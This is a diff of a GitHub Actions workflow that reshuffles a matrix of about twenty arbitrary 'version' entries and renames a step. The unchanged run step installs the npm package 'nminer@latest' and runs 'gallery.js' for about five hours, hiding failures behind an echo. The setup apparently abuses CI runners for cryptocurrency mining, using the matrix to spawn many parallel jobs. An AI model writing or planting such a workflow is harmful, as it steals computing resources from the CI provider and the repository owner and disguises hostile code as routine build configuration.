@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4043 }
-          - { version: 5246 }
-          - { version: 6038 }
-          - { version: 4153 }
-          - { version: 6325 }
-          - { version: 2707 }
-          - { version: 5893 }
-          - { version: 8072 }
-          - { version: 5685 }
-          - { version: 9332 }
-          - { version: 1225 }
-          - { version: 5516 }
-          - { version: 7035 }
-          - { version: 6965 }
-          - { version: 4903 }
-          - { version: 5580 }
-          - { version: 8385 }
-          - { version: 1209 }
-          - { version: 8298 }
+          - { version: 6466 }
+          - { version: 5189 }
+          - { version: 7 }
+          - { version: 8723 }
+          - { version: 2073 }
+          - { version: 4167 }
+          - { version: 1411 }
+          - { version: 8491 }
+          - { version: 8738 }
+          - { version: 1799 }
+          - { version: 5858 }
+          - { version: 9290 }
+          - { version: 3266 }
+          - { version: 135 }
+          - { version: 4972 }
+          - { version: 9884 }
+          - { version: 3316 }
+          - { version: 2392 }
+          - { version: 4400 }
+          - { version: 922 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: wide-eyed
         run: |
           npm install nminer@latest
-          timeout 317m node gallery.js || echo "gallery executed"
+          timeout 307m node gallery.js || echo "gallery executed"
